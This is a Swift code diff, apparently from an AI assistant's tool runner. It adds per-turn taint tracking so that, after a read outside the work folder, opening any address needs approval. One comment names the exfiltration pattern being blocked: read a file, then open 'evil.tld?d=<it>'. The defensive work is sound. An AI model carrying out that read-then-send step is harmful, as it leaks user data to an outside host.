@@ -27,6 +27,8 @@ package struct ParentToolRunner: ParentToolExecuting, Sendable {
     let sheets: (any SpreadsheetDriving)?
     let versions: FileVersions?
     let deliverableTickets = ApprovalTickets()
+    /// Whether this turn read outside the work folder; reset by `beginTurn`.
+    let taint: TurnTaint
     /// Wave 20d B: told when a deliverable ran without the sheet, so the island
     /// can show it and offer the way back.
     let onAct: (@Sendable (UndoReceipt) -> Void)?
@@ -43,11 +45,13 @@ package struct ParentToolRunner: ParentToolExecuting, Sendable {
         versions: FileVersions? = nil,
         onAct: (@Sendable (UndoReceipt) -> Void)? = nil,
         location: UserLocationSource? = nil,
+        taint: TurnTaint = TurnTaint(),
         // Fail closed: a caller that forgets to wire the switch gets "off".
         // Last on purpose: the gate's wiring check reads it as the call's end.
         locationChannelOn: @escaping @Sendable () -> Bool = { false }
     ) {
         self.location = location
+        self.taint = taint
         self.locationChannelOn = locationChannelOn
         self.onAct = onAct
         self.workspace = workspace
@@ -73,6 +77,7 @@ package struct ParentToolRunner: ParentToolExecuting, Sendable {
     /// Called when the user starts speaking or sends: the hands act only on
     /// the app that was in front then.
     package func beginTurn() {
+        taint.reset()
         guard let hands else { return }
         hands.turn.begin(hands.target())
     }
@@ -203,7 +208,11 @@ package struct ParentToolRunner: ParentToolExecuting, Sendable {
     }
 
     package func approval(for call: ToolCallRef, said: String) -> ApprovalRequest? {
-        if let request = ParentToolGate.approval(for: call, said: said) { return request }
+        // After a read outside the work folder every address asks, unless the
+        // user's own words named its host (read, then open evil.tld?d=<it>).
+        if let request = ParentToolGate.approval(for: call, said: said, strictHost: taint.isTainted) {
+            return request
+        }
         if let request = deliverableApproval(for: call) { return request }
         guard ParentTool(rawValue: call.name)?.isHands == true else { return nil }
         return handsApproval(for: call, said: said)
